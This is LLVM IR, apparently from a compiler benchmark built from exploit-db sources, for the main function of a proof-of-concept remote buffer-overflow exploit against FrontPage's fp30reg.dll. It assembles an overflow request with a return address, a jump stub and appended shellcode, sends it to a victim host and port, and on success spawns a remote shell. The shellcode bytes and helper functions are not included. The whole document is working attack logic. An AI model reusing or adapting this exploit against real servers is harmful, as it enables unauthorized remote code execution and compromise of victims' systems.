; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_20950.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_20950.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.fppath = private unnamed_addr constant [31 x i8] c"/_vti_bin/_vti_aut/fp30reg.dll\00", align 16
@__const.main.server = private unnamed_addr constant [17 x i8] c"www.blahblah.com\00", align 16
@__const.main.retaddress = private unnamed_addr constant [5 x i8] c"b\18\D5g\00", align 1
@__const.main.jmpshell = private unnamed_addr constant [4 x i8] c"\FFfx\00", align 1
@.str = private unnamed_addr constant [78 x i8] c"Proof of concept code for fp30reg.dll overflow bug by NSFOCUS Security Team\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [25 x i8] c"Usage: %s victim [port]\0A\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c"%c\00", align 1
@.str.3 = private unnamed_addr constant [4 x i8] c"aaa\00", align 1
@.str.4 = private unnamed_addr constant [107 x i8] c"GET %s?%s HTTP/1.1 \0AHOST:%s\0D\0AContent-Type: text/html\0AContent-Length:%d\0D\0AProxy_Connection: Keep-Alive\0D\0A\0D\0A%s\00", align 1
@shellcode = common dso_local global i8* null, align 8
@.str.5 = private unnamed_addr constant [15 x i8] c"buff len = %d\0A\00", align 1
@.str.6 = private unnamed_addr constant [15 x i8] c"payload sent!\0A\00", align 1
@.str.7 = private unnamed_addr constant [5 x i8] c"EOF\0A\00", align 1
@.str.8 = private unnamed_addr constant [8 x i8] c"XORDATA\00", align 1
@.str.9 = private unnamed_addr constant [17 x i8] c"exploit succeed\0A\00", align 1
@.str.10 = private unnamed_addr constant [16 x i8] c"exploit failed\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [400 x i8], align 16
  %7 = alloca [4096 x i8], align 16
  %8 = alloca [31 x i8], align 16
  %9 = alloca [17 x i8], align 16
  %10 = alloca [5 x i8], align 1
  %11 = alloca [4 x i8], align 1
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %15 = bitcast [31 x i8]* %8 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %15, i8* align 16 getelementptr inbounds ([31 x i8], [31 x i8]* @__const.main.fppath, i32 0, i32 0), i64 31, i1 false)
  %16 = bitcast [17 x i8]* %9 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %16, i8* align 16 getelementptr inbounds ([17 x i8], [17 x i8]* @__const.main.server, i32 0, i32 0), i64 17, i1 false)
  %17 = bitcast [5 x i8]* %10 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %17, i8* align 1 getelementptr inbounds ([5 x i8], [5 x i8]* @__const.main.retaddress, i32 0, i32 0), i64 5, i1 false)
  %18 = bitcast [4 x i8]* %11 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %18, i8* align 1 getelementptr inbounds ([4 x i8], [4 x i8]* @__const.main.jmpshell, i32 0, i32 0), i64 4, i1 false)
  store i32 80, i32* %14, align 4
  %19 = load i32, i32* %4, align 4
  %20 = icmp slt i32 %19, 2
  br i1 %20, label %21, label %28

21:                                               ; preds = %2
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str, i64 0, i64 0))
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 0
  %25 = load i8*, i8** %24, align 8
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.1, i64 0, i64 0), i8* %25)
  %27 = call i32 @exit(i32 -1) #4
  unreachable

28:                                               ; preds = %2
  %29 = load i32, i32* %4, align 4
  %30 = icmp sgt i32 %29, 2
  br i1 %30, label %31, label %36

31:                                               ; preds = %28
  %32 = load i8**, i8*** %5, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 2
  %34 = load i8*, i8** %33, align 8
  %35 = call i32 @atoi(i8* %34)
  store i32 %35, i32* %14, align 4
  br label %36

36:                                               ; preds = %31, %28
  %37 = load i8**, i8*** %5, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 1
  %39 = load i8*, i8** %38, align 8
  %40 = load i32, i32* %14, align 4
  %41 = call i32 @connect_to(i8* %39, i32 %40)
  store i32 %41, i32* %13, align 4
  %42 = getelementptr inbounds [400 x i8], [400 x i8]* %6, i64 0, i64 0
  %43 = call i32 @bzero(i8* %42, i32 400)
  %44 = getelementptr inbounds [4096 x i8], [4096 x i8]* %7, i64 0, i64 0
  %45 = call i32 @bzero(i8* %44, i32 4096)
  %46 = getelementptr inbounds [400 x i8], [400 x i8]* %6, i64 0, i64 0
  %47 = call i32 @memset(i8* %46, i8 signext 97, i32 258)
  %48 = getelementptr inbounds [400 x i8], [400 x i8]* %6, i64 0, i64 0
  %49 = getelementptr inbounds [4 x i8], [4 x i8]* %11, i64 0, i64 0
  %50 = getelementptr inbounds [4 x i8], [4 x i8]* %11, i64 0, i64 0
  %51 = call i32 @strlen(i8* %50)
  %52 = call i32 @memcpy(i8* %48, i8* %49, i32 %51)
  %53 = getelementptr inbounds [400 x i8], [400 x i8]* %6, i64 0, i64 0
  %54 = getelementptr inbounds i8, i8* %53, i64 258
  %55 = call i32 @strcpy(i8* %54, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0))
  store i32 0, i32* %12, align 4
  br label %56

56:                                               ; preds = %63, %36
  %57 = load i32, i32* %12, align 4
  %58 = icmp slt i32 %57, 80
  br i1 %58, label %59, label %66

59:                                               ; preds = %56
  %60 = getelementptr inbounds [400 x i8], [400 x i8]* %6, i64 0, i64 0
  %61 = getelementptr inbounds [5 x i8], [5 x i8]* %10, i64 0, i64 0
  %62 = call i32 @strncat(i8* %60, i8* %61, i32 4)
  br label %63

63:                                               ; preds = %59
  %64 = load i32, i32* %12, align 4
  %65 = add nsw i32 %64, 4
  store i32 %65, i32* %12, align 4
  br label %56

66:                                               ; preds = %56
  %67 = getelementptr inbounds [400 x i8], [400 x i8]* %6, i64 0, i64 0
  %68 = call i32 @strcat(i8* %67, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.3, i64 0, i64 0))
  %69 = getelementptr inbounds [4096 x i8], [4096 x i8]* %7, i64 0, i64 0
  %70 = getelementptr inbounds [31 x i8], [31 x i8]* %8, i64 0, i64 0
  %71 = getelementptr inbounds [400 x i8], [400 x i8]* %6, i64 0, i64 0
  %72 = getelementptr inbounds [17 x i8], [17 x i8]* %9, i64 0, i64 0
  %73 = load i8*, i8** @shellcode, align 8
  %74 = call i32 @strlen(i8* %73)
  %75 = load i8*, i8** @shellcode, align 8
  %76 = call i32 @sprintf(i8* %69, i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.4, i64 0, i64 0), i8* %70, i8* %71, i8* %72, i32 %74, i8* %75)
  %77 = getelementptr inbounds [4096 x i8], [4096 x i8]* %7, i64 0, i64 0
  %78 = call i32 @strlen(i8* %77)
  %79 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.5, i64 0, i64 0), i32 %78)
  %80 = load i32, i32* %13, align 4
  %81 = getelementptr inbounds [4096 x i8], [4096 x i8]* %7, i64 0, i64 0
  %82 = getelementptr inbounds [4096 x i8], [4096 x i8]* %7, i64 0, i64 0
  %83 = call i32 @strlen(i8* %82)
  %84 = call i32 @write(i32 %80, i8* %81, i32 %83)
  %85 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.6, i64 0, i64 0))
  %86 = load i32, i32* %13, align 4
  %87 = getelementptr inbounds [4096 x i8], [4096 x i8]* %7, i64 0, i64 0
  %88 = getelementptr inbounds [4096 x i8], [4096 x i8]* %7, i64 0, i64 0
  %89 = call i32 @strlen(i8* %88)
  %90 = call i64 @read(i32 %86, i8* %87, i32 %89)
  %91 = icmp slt i64 %90, 0
  br i1 %91, label %92, label %95

92:                                               ; preds = %66
  %93 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.7, i64 0, i64 0))
  %94 = call i32 @exit(i32 -1) #4
  unreachable

95:                                               ; preds = %66
  %96 = getelementptr inbounds [4096 x i8], [4096 x i8]* %7, i64 0, i64 0
  %97 = call i64 @memcmp(i8* %96, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i64 0, i64 0), i32 8)
  %98 = icmp eq i64 %97, 0
  br i1 %98, label %99, label %103

99:                                               ; preds = %95
  %100 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.9, i64 0, i64 0))
  %101 = load i32, i32* %13, align 4
  %102 = call i32 @runshell(i32 %101)
  br label %108

103:                                              ; preds = %95
  %104 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.10, i64 0, i64 0))
  %105 = load i32, i32* %13, align 4
  %106 = call i32 @close(i32 %105)
  %107 = call i32 @exit(i32 -1) #4
  unreachable

108:                                              ; preds = %99
  br label %109

109:                                              ; preds = %108
  %110 = load i32, i32* %3, align 4
  ret i32 %110
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @connect_to(i8*, i32) #2

declare dso_local i32 @bzero(i8*, i32) #2

declare dso_local i32 @memset(i8*, i8 signext, i32) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @strcpy(i8*, i8*) #2

declare dso_local i32 @strncat(i8*, i8*, i32) #2

declare dso_local i32 @strcat(i8*, i8*) #2

declare dso_local i32 @sprintf(i8*, i8*, i8*, i8*, i8*, i32, i8*) #2

declare dso_local i32 @write(i32, i8*, i32) #2

declare dso_local i64 @read(i32, i8*, i32) #2

declare dso_local i64 @memcmp(i8*, i8*, i32) #2

declare dso_local i32 @runshell(i32) #2

declare dso_local i32 @close(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
